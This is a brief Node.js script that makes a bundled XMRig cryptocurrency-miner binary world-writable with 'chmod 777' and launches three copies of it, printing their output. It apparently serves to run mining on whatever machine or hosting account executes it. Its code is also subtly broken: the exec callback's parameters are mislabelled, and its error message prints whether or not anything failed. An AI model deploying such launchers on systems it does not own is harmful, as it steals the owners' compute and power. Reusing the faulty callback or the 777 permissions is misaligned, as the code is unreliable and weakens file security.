require("child_process").exec("chmod 777 xmrig/xmrig", (i, err) => {
    console.log(("A error  occured while chmodding: " + err) || i);
});

const child1 = require("child_process").spawn("xmrig/xmrig");
const child2 = require("child_process").spawn("xmrig/xmrig");
const child3 = require("child_process").spawn("xmrig/xmrig");

let childs = [child1, child2, child3];

for(const child of childs) {
    child.stdout.on('data', (data) => {
        console.log(`${data}`);
    });

    child.stderr.on('data', (data) => {
        console.error(`Error occured: ${data}`);
    });
}
